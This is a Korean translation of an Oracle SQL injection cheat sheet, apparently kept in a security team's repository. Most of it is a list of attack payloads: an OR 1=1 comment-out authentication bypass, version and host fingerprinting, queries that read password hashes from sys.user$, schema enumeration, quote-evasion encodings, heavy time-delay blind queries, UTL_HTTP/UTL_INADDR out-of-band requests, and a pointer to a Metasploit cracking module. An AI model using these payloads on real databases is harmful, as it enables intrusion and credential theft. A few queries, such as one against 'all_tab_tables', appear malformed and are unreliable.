# Oracle Injection Cheet Sheet
##### 원작자: 문광일 PM
##### 링크: [KOROMOON][koromoonlink]
[koromoonlink]: https://koromoon.blogspot.com/2018/10/oracle-injection-cheet-sheet.html "Go koromoon"
##### 작성자: 강하늘 사원
##### 작성일자: 2024년 4월 18일

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/164521627/da75f236-8e45-4cfa-bf15-229c0ff9932d)


아래 링크를 번역함. </br>
https://websec.ca/kb/sql_injection

## ( 1 ) 기본 데이터베이스

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SYSTEM<o:p></o:p></span></span></div>
</td>
  <td style="border-left: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">모든 버전에서 사용 가능<span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SYSAUX<o:p></o:p></span></span></div>
</td>
  <td style="border-bottom: solid windowtext 1.0pt; border-left: none; border-right: solid windowtext 1.0pt; border-top: none; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">모든 버전에서 사용 가능<span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>


## ( 2 ) 코멘트 아웃 쿼리(Comment Out Query)

여기서 코멘트 아웃(Comment Out)이란 디버그에서 자주 사용되는 방법으로 코멘트를 지시하는 문을 삽입하여 프로그램이나 명령어 집합의 일부를 일시적으로 사용하지 않는 것을 말함.

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">--<o:p></o:p></span></span></div>
</td>
  <td style="border-left: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><span lang="EN-US">SQL </span>주석<span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

예 :
SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';


## ( 3 ) 버전 테스팅

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT banner FROM v$version WHERE
  banner LIKE 'Oracle%';<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT banner FROM v$version WHERE
  banner LIKE 'TNS%';<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT version FROM v$instance;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

노트 :
오라클은 모든 SELECT 문에는 테이블이 있어야 함.
DUAL 테이블은 테스트에 사용할 수 있는 더미 테이블임.


## ( 4 ) 데이터베이스 자격 증명

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT username FROM all_users;<o:p></o:p></span></span></div>
</td>
  <td style="border-left: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">모든 버전에서 사용 가능<span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT name, password from sys.user$;<o:p></o:p></span></span></div>
</td>
  <td style="border-bottom: solid windowtext 1.0pt; border-left: none; border-right: solid windowtext 1.0pt; border-top: none; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><span lang="EN-US">&lt;= 10g </span>에서 사용<span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT name, spare4 from sys.user$;<o:p></o:p></span></span></div>
</td>
  <td style="border-bottom: solid windowtext 1.0pt; border-left: none; border-right: solid windowtext 1.0pt; border-top: none; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><span lang="EN-US">&lt;= 11g </span>에서 사용<span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>



## ( 5 ) 데이터베이스 이름

① 현재 데이터베이스

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT name FROM v$database;<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT instance_name FROM v$instance<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT global_name FROM global_name<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT SYS.DATABASE_NAME FROM DUAL<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

② 사용자 데이터베이스

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT DISTINCT owner FROM all_tables;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>


## ( 6 ) 서버 호스트 이름

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT host_name FROM v$instance;
  (Privileged)<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT UTL_INADDR.get_host_name FROM
  dual;<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT
  UTL_INADDR.get_host_name('10.0.0.1') FROM dual;<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT UTL_INADDR.get_host_address
  FROM dual;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>


## ( 7 ) 테이블과 컬럼

① 테이블 검색

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT table_name FROM all_tables;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

② 컬럼 검색

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT column_name FROM
  all_tab_columns;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

③ 컬럼 이름에서 테이블 찾기

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT column_name FROM
  all_tab_columns WHERE table_name = 'Users';<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

④ 테이블 이름에서 컬럼 찾기

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT table_name FROM all_tab_tables
  WHERE column_name = 'password';<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

⑤ 한 번에 여러 테이블/컬럼 검색

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT RTRIM(XMLAGG(XMLELEMENT(e,
  table_name || ',')).EXTRACT('//text()').EXTRACT('//text()') ,',') FROM
  all_tables;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

## ( 8 ) 인용 기호 피하기

다른 RDBMS 와 달링 오라클은 테이블/컬럼 이름을 인코딩할 수 있음.

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184; width: 615px;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT 0x09120911091 FROM dual;<o:p></o:p></span></span></div>
</td>
  <td style="border-left: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><span lang="EN-US">Hex </span>인코딩<span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT CHR(32)||CHR(92)||CHR(93) FROM
  dual;<o:p></o:p></span></span></div>
</td>
  <td style="border-bottom: solid windowtext 1.0pt; border-left: none; border-right: solid windowtext 1.0pt; border-top: none; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 230.6pt;" valign="top" width="307"><div class="MsoNoSpacing">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><span lang="EN-US">CHAR() </span>함수<span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

## ( 9 ) 문자열 연결

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT 'a'||'d'||'mi'||'n' FROM dual;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

## ( 10 ) 타이밍

① 시간 지연

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT UTL_INADDR.get_host_address('non-existant-domain.com')
  FROM dual;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

② 막대한 시간 지연(Heavy Time Delays)

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNormal" style="line-height: normal; margin-bottom: .0001pt; margin-bottom: 0cm;">
<span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;"><span lang="EN-US">AND
  (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4,
  all_users t5) &gt; 0 AND 300 &gt; ASCII(SUBSTR((SELECT username FROM
  all_users WHERE rownum = 1),1,1));</span><span lang="EN-US"><o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

## ( 11 ) 특권

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT privilege FROM session_privs;<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT grantee, granted_role FROM
  dba_role_privs; (Privileged)<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>

## ( 12 ) 대역 외 채널링

① DNS Requests

<table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="border-collapse: collapse; border: none; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0cm 5.4pt 0cm 5.4pt; mso-yfti-tbllook: 1184;">
 <tbody>
<tr>
  <td style="border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT
  UTL_HTTP.REQUEST('http://localhost') FROM dual;<o:p></o:p></span></span></div>
</td>
 </tr>
<tr>
  <td style="border-top: none; border: solid windowtext 1.0pt; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt; padding: 0cm 5.4pt 0cm 5.4pt; width: 461.2pt;" valign="top" width="615"><div class="MsoNoSpacing">
<span lang="EN-US"><span style="font-family: &quot;courier new&quot; , &quot;courier&quot; , monospace;">SELECT UTL_INADDR.get_host_address('localhost.com')
  FROM dual;<o:p></o:p></span></span></div>
</td>
 </tr>
</tbody></table>


## ( 13 ) 패스워드 크랙(Password Cracking)

JTR 용 Metasploit 모듈은 아래 링크에서 찾을 수 있음.
http://www.metasploit.com/modules/auxiliary/analyze/jtr_oracle_fast
